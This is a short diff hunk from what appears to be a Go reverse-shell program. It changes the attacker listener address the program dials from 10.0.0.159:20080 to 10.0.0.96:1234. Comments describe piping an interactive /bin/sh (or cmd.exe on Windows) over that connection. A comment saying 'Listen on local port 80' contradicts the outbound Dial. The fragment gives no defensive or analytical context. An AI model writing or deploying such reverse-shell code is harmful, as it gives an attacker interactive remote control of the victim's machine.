@@ -10,7 +10,7 @@ import (
 
 func main() {
 	// Listen on local port 80
-	conn, _ := net.Dial("tcp", "10.0.0.159:20080")
+	conn, _ := net.Dial("tcp", "10.0.0.96:1234")
 	// Explicitly calling /bin/sh and using -i for interactive mode
 	// so that we can use it for stdin and stdout.
 	// For Windows use exec.Command("cmd.exe").
